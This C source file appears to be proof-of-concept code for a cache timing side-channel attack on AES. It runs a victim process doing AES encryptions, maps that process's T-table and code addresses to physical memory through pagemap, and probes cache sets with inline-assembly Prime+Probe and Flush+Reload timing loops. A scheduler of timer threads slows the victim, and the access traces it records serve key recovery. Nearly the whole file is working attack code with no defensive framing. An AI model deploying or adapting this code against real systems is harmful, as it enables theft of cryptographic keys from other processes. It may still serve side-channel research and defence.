#include "tools.h"

#define TABLE_SIZE	4096
#define THRESHOLD	600
#define FLUSH_THRESH    130
#define NTHREADS	(1*1024)
//#define NTHREADS    (16*1024)
//#define DELAY		5000000
#define DELAY		50000

//#define BUSY		16958670

//#define BUSY		16958770
//#define BUSY		16958570
#define BUSY            165000

#define BUSY_ADD	1000
//#define BUSY_FACTOR	8
#ifndef BUSY_FACTOR
#define BUSY_FACTOR	1
#endif

#define EPSILON		5000
//#define USE_FLUSH       0

//#define ITERATIONS  (16*4096)
#define ITERATIONS	(1024)

#if USE_FLUSH
#define ITER_COUNT      ITERATIONS
#else
#define ITER_COUNT      (ITERATIONS*BUSY_FACTOR)
#endif

#define VECTOR_SIZE	(SET_COUNT/64)

unsigned char critical_table[TABLE_SIZE] __attribute__((aligned(TABLE_SIZE)));

#define USE_ENCRYPT	1
#define USE_VICTIM	0
#define USE_SLOWDOWN	1
#define USE_INSATTACK	1


#define TIME_HASH	0
#if TIME_HASH
#undef ITER_COUNT
#define ITER_COUNT	4096
#endif

#define LOG_VICTIM	0
#define LOG_SCHEDULE	0
#define LOG_ATTACK	0


pid_t parent;
pid_t victim;
timer_t timers[NTHREADS];
volatile int timer_ready = 0;
volatile unsigned long result_iter = 0;
volatile unsigned long result_bitvector[ITER_COUNT*VECTOR_SIZE];
char* result_file1;
char* result_file2;


void * schedule(void* arg) {
  int i = (intptr_t) arg;
  volatile timer_t* next;
  if(i+1==NTHREADS) next = &timers[0];
  else next = &timers[i+1];
  set_timer(&timers[i]);

  if(i==0) timer_ready = 1;
  while(1) {
    inr_pause();
#if LOG_SCHEDULE
    LOGI(START, i);
#endif
    SET_ALARM((*next), DELAY);
    ADVANCE();

#if !USE_FLUSH
  if((*iteration)%BUSY_FACTOR!=(BUSY_FACTOR-1)) {
    FDELAY(BUSY+BUSY_ADD);
  }
  else
#endif
    FDELAY(BUSY);

#if LOG_SCHEDULE
    LOGI(END, i);
#endif
  }
}

void run_scheduler() {
  pthread_t thread, thread0=0;
  int i;
  int s;
#if LOG_SCHEDULE
  log_file = "log_sched";
  atexit(print_log);
  idx = 0;
#endif
  for(i=0; i<NTHREADS; i++) {
    s=pthread_create(&thread, NULL, schedule, (void *) (intptr_t) i);
    if(s != 0) {
      perror("pthread create error");
      exit(EXIT_FAILURE);
    }
    if(i==0) thread0 = thread;
  }
  while(!timer_ready);
  inr_sleep(1);
  pthread_kill(thread0, SIGALRM);
  inr_pause();
}

void segfaulted() {
  fprintf(stderr,"\nSegmentation fault. (idx=%d)\n", set_idx);
  exit(EXIT_FAILURE);
}

void run_encrypt() {
  uint8_t buffer1[16];
  uint8_t buffer2[16];
  uint8_t *b1, *b2, *p;
  b1=buffer1;
  b2=buffer2;
  memcpy(b1, in_ref, sizeof(in_ref));
#if TIME_HASH
  FILE* f;
  unsigned long t0=0, t1=0, t2=0, t3=0;
#else
  log_file = "log_encrypt";
  set_idx = 0;
  atexit(print_sets);
#endif
  signal(SIGSEGV, &segfaulted);
  while(*iteration < ITER_COUNT) {
#if TIME_HASH
    set_idx=0;
    if(*iteration==1)
      t0=readtsc();
    if(*iteration==23)
      t2=readtsc();
#endif
    AES_encrypt(b1,b2,&key_ref);
#if TIME_HASH
    if(t0!=0 || t2!=0) {
      *iteration=*iteration+1;
    }
    if(*iteration==21) {
      t1=readtsc()-t0;
      t0=0;
      *iteration=*iteration+1;
    }
    if(*iteration==43) {
      t3=readtsc()-t2;
      *iteration=-1;
      break;
    }
#endif
    p=b1;
    b1=b2;
    b2=p;
    if(*iteration == 0) {
      set_idx = 0;
      memcpy(b1, in_ref, sizeof(in_ref));
    }
  }
#if TIME_HASH
  f=fopen("out_hashtime", "a");
  fprintf(f,"%ld %ld\n", t1, t3);
#endif
}

void run_victim() {
  volatile register unsigned char *r;
#if LOG_VICTIM
  uint64_t last=0, current;
#endif
//  register int i=0,j=0;
  log_file = "log_victim";
  atexit(print_log);
  idx = 0;
  memset(critical_table, 0, TABLE_SIZE);
  while(1) {
//    r = &critical_table[(i+ 1)*CACHE_LINE]; *r = *r + 1;
//    r = &critical_table[(i+44)*CACHE_LINE]; *r = *r + 1;
//    r = &critical_table[(i+ 5)*CACHE_LINE]; *r = *r + 1;

//    r = &critical_table[(i+3)*CACHE_LINE];
//    *r;
//    j++;
//    i=8*((j>>3)&1);

//    r = &critical_table[(i+24)*CACHE_LINE]; *r = *r + 1;
//    r = &critical_table[(i+50)*CACHE_LINE]; *r = *r + 1;
    r = &critical_table[25*CACHE_LINE]; *r = *r + 1;
    r = &critical_table[34*CACHE_LINE]; *r = *r + 1;
    r = &critical_table[52*CACHE_LINE]; *r = *r + 1;

//{
//  volatile int foo=0;
//  while(foo<2) foo++;
//}

#if LOG_VICTIM
    current=readtsc();
    if(last==0)
      LOGT(current, START);
    else if(current-last > EPSILON) {
      LOGT(last, END);
      LOGT(current, START);
    }
    last = current;
#endif

  }
}

void pass2(struct line* h) {
#if LOG_ATTACK
  LOGA(START);
#endif
  asm volatile(
	"mov %[head], %%rdi;"
	"xor %%esi, %%esi;"
	"xor %%r14, %%r14;"
	"mov %[bitvector], %%r13;"
	"0: "
	"xor %%r8d, %%r8d;"
	"xor %%rax, %%rax; cpuid; rdtsc; mov %%eax, %%ebx;"
	"1:"
	"mov (%%rdi), %%rdi;"
	"inc %%r8d;"
	"cmp %[ways], %%r8d;"
	"jl 1b;"
	"rdtscp; sub %%ebx, %%eax; mov %%eax, %%r15d; xor %%eax, %%eax; cpuid;"
	"shl $1, %%r14; cmp %[thresh], %%r15d; jl 2f; or $1, %%r14;2:"
	"inc %%esi;"
	"test $63, %%esi; jnz 2f; mov %%r14, (%%r13); xor %%r14, %%r14; add $8, %%r13; 2:"
	"test %%rdi, %%rdi;"
	"jnz 0b;"
	:
	:
	  [ways] "i" (CACHE_WAYS),
	  [thresh] "i" (THRESHOLD),
	  [bitvector] "g" (&result_bitvector[result_iter*VECTOR_SIZE]),
	  [iter] "r" (result_iter),
	  [head] "g" (h)
	: "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r8", "r9", "r10", "r13", "r14", "r15");
#if LOG_ATTACK
  LOGA(END);
#endif
}


unsigned char _deck[64] =  {54,56,27, 5,32,21,17,45,39,51,36,16,37, 6,33,55,
                            43,34,31, 1,19,59,63,47,26,13,30,24, 3,52,29, 7,
                            22,18, 2,41, 8,44,20, 4,23,62,42, 9,14,12,35,50,
                            11,10,46,58,61,49,60,25, 0,57,15,40,28,53,48,38};
unsigned char _rdeck[64] = {56,19,34,28,39, 3,13,31,36,43,49,48,45,25,44,58,
                            11, 6,33,20,38, 5,32,40,27,55,24, 2,60,30,26,18,
                             4,14,17,46,10,12,63, 8,59,35,42,16,37, 7,50,23,
                            62,53,47, 9,29,61, 0,15, 1,57,51,21,54,52,41,22};

void pass2_flush_reload(unsigned long critical_table) {
  asm volatile(
        "xor %%esi, %%esi;"
        "mov %[table], %%rdi;"
        "xor %%r14, %%r14;"
        "mov %[bitvector], %%r13;"
        "1:"
        "xor %%rax, %%rax;"
        "mov %[table], %%rdi;"
        "mov %c[deck](,%%esi,1),%%al;sal $6,%%eax; add %%rax, %%rdi;"
        "xor %%rax, %%rax; cpuid; rdtsc; mov %%eax, %%ebx;"
        "mov (%%rdi), %%rax;"
        "rdtscp; sub %%ebx, %%eax; mov %%eax, %%r15d; xor %%eax, %%eax; cpuid;"
        "clflush (%%rdi);"
        "shl $1, %%r14; cmp %[thresh], %%r15d; ja 2f; or $1, %%r14;2:"
        "inc %%esi; cmp $64, %%esi; jl 1b;"
        "mov %%r14, (%%r13);"
        :
        :
          [thresh] "i" (FLUSH_THRESH),
          [bitvector] "g" (&result_bitvector[result_iter*VECTOR_SIZE]),
          [deck] "i" (_deck),
          [table] "g" (critical_table)
        : "rax", "rbx", "rcx", "rdx", "rsi", "rdi", "r13", "r14", "r15");
}

#define S_NOISE		"0.5"
#define S_REMOVED	"0.2"
#define S_ACCESS	"1"
#define S_NONE		"0"

void print_results() {
    FILE* out = fopen(result_file1, "w");
    FILE* out_nr = fopen(result_file2, "w");
    int s, i, b, blast;
    char* c;
    for(s=0; s<SET_COUNT; s++) {
      blast=0;
      for(i=0; i<ITER_COUNT; i++) {
        b=bit(result_bitvector[i*VECTOR_SIZE+(s/64)], 63-(s%64));
        if(BUSY_FACTOR>1 && blast==1 && b==1)
          c=S_REMOVED;
        else if(i%BUSY_FACTOR!=0 && b==1)
          c=S_NOISE;
        else if(b==1)
          c=S_ACCESS;
        else
          c=S_NONE;
        if(i<16384)
          fprintf(out,"%s ", c);
        if(i%BUSY_FACTOR==0)
          fprintf(out_nr,"%s ", c);
        blast=b;
      }
      fprintf(out, "\n");
      fprintf(out_nr, "\n");
    }
  }


void run_insattack() {
  FILE *target_pm;
  FILE *self_pm;
  unsigned long target = (unsigned long) &AES_encrypt;
  unsigned long target_phys;
  unsigned long target_hash;
  struct line* head=NULL;
  struct line* tail=NULL;
  struct table table;
  long advance = 16;
  result_file1 = "ins_out";
  result_file2 = "ins_out_nr";
  atexit(print_results);
  self_pm=open_pagemap_file(getpid());
  assert(self_pm!=NULL);
  target_pm = open_pagemap_file(victim);
  assert(target_pm != NULL);
  while((target_phys=virtual_to_physical(target_pm, target))==0);
  target_hash = hash(target_phys);
  fprintf(stderr, "Ins Hash = %05lX\n", target_hash);
  fill_table(target_hash, self_pm, &table);
  shuffle_link_lines(&head, &tail, &table);
  {
    FILE* out_address = fopen("out_insaddresses", "w");
    print_addresses(head, self_pm, out_address);
  }

  while(result_iter<ITER_COUNT){
    WAIT_TO_ADVANCE(advance);
    pass2(head);
    result_iter++;
    *iteration = result_iter;
  }

}

int main(int argc, char** argv) {
  FILE *target_pm;
  FILE *self_pm;
  unsigned long target;
  unsigned long target_phys;
  unsigned long target_hash;
  struct line* head=NULL;
  struct line* tail=NULL;
#if USE_ENCRYPT
  target = (unsigned long) Te3;
#elif USE_VICTIM
  target = (unsigned long) critical_table;
#endif
  struct table table;
  long advance = 16;
  fprintf(stderr, "getpid();\n");
  parent = getpid();
#if USE_SLOWDOWN
  pid_t core1;
#endif
#if USE_INSATTACK
  pid_t core2;
#endif

  fprintf(stderr, "adjust_ns_per_cycle();\n");
  adjust_ns_per_cycle();
  fprintf(stderr, "init_shared();\n");
  init_shared();
  fprintf(stderr, "set_affinity(1);\n");
  set_affinity(1);
  fprintf(stderr, "setbuf(stderr,NULL);\n");
  setbuf(stderr,NULL);
  signal(SIGINT, terminate);
  signal(SIGALRM, wakeup);
#if USE_ENCRYPT
  victim = run_function(3, run_encrypt);
#elif USE_VICTIM
  victim = run_function(3, run_victim);
#endif

#if USE_SLOWDOWN
  core1 = run_function(3, run_scheduler);
#endif
#if USE_INSATTACK
  core2 = run_function(2, run_insattack);
#endif


#if LOG_ATTACK
  log_file = "log_attack";
  atexit(print_log);
  idx = 0;
#endif

#if USE_FLUSH
  while(result_iter<ITER_COUNT){
    WAIT_TO_ADVANCE(advance);
    pass2_flush_reload((unsigned long)Te3);
    result_iter++;
    *iteration = result_iter;
  }

#if USE_SLOWDOWN
  kill(core1, SIGINT);
  waitpid(core1, NULL, 0);
#endif
  kill(victim, SIGINT);
  waitpid(victim, NULL, 0);
  {
    FILE* out = fopen("out_flush_reload", "w");
    int s, i, b;
    int si;
    for(si=0; si<SET_COUNT; si++) {
      s=_rdeck[si];
      for(i=0; i<ITER_COUNT; i++) {
        b=bit(result_bitvector[i*VECTOR_SIZE+(s/64)], 63-(s%64));
        fprintf(out,"%d ", b);
      }
      fprintf(out, "\n");
    }
  }
  return 0;
#endif

  self_pm = open_pagemap_file(getpid());
  if(self_pm == NULL)
    fprintf(stderr, "pagemap open failed\n");

#if USE_ENCRYPT || USE_VICTIM
  target_pm = open_pagemap_file(victim);
  if(target_pm == NULL)
    fprintf(stderr, "pagemap open failed\n");
  while((target_phys=virtual_to_physical(target_pm, target))==0);
#else
  target_phys = 0;
#endif

#if TIME_HASH
  if(argc==1) {
    fprintf(stderr,"actual hash is %05lX.\n",hash(target_phys));
    kill(core1, SIGINT);
    waitpid(core1, NULL, 0);
    kill(victim, SIGINT);
    waitpid(victim, NULL, 0);
    return 0;
  }
  target_hash = strtol(argv[1],NULL,16);
  fill_table(target_hash, self_pm, &table);
  shuffle_link_lines(&head, &tail, &table);
  char started=0, passing=0;
  while(1) {
    WAIT_TO_ADVANCE(advance);
    if(passing)
      pass2(head);
    if(!started) {
      *iteration=1;
      started=1;
    }
    else if(*iteration==22) {
      if(passing) *iteration=23;
      passing=1;
    }
    else if(*iteration==-1)
      break;
  }
  kill(core1, SIGINT);
//  kill(victim, SIGINT);
  waitpid(core1, NULL, 0);
  waitpid(victim, NULL, 0);
  return 0;
#endif

  target_hash = hash(target_phys);
  fprintf(stderr, "Hash = %05lX\n", target_hash);
  fprintf(stderr, "fill_table(target_hash, self_pm, &table);\n");
  fill_table(target_hash, self_pm, &table);
  fprintf(stderr, "shuffle_link_lines(&head, &tail, &table);\n");
  shuffle_link_lines(&head, &tail, &table);
  {
    FILE* out_address = fopen("out_addresses", "w");
    print_addresses(head, self_pm, out_address);
  }

  fprintf(stderr, "while(result_iter<ITER_COUNT){\n");
  while(result_iter<ITER_COUNT){
    WAIT_TO_ADVANCE(advance);
#if USE_AES
    if(result_iter == 0)
      kill(victim, SIGALRM);
#endif
    pass2(head);
    result_iter++;
    *iteration = result_iter;
  }

  WAIT_TO_ADVANCE(advance);
  kill(victim, SIGINT);
  kill(core1, SIGINT);
  waitpid(victim, NULL, 0);
  waitpid(core1, NULL, 0);

  kill(core2, SIGINT);
  waitpid(core2, NULL, 0);

  result_file1="out";
  result_file2="out_nr";

  print_results();

  return 0;
}
